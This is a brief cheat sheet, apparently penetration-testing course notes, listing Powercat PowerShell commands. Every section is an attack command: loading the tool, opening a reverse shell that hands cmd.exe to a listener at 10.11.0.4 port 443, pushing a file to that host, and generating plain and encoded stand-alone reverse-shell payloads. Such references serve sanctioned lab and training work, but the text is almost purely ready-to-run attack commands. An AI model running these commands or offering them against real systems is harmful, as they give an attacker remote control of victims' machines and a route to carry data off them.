### Load Powercat

```powershell
. .\powercat.ps1
```

### Powercat Reverse Shells

```powershell
powercat -c 10.11.0.4 -p 443 -e cmd.exe
```

### Powercat File Transfers

```powershell
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```

### Powercat Stand-Alone Payloads

#### Plain text payload :  
```powershell
powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
```
#### Encoded payload
```powershell
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell
```

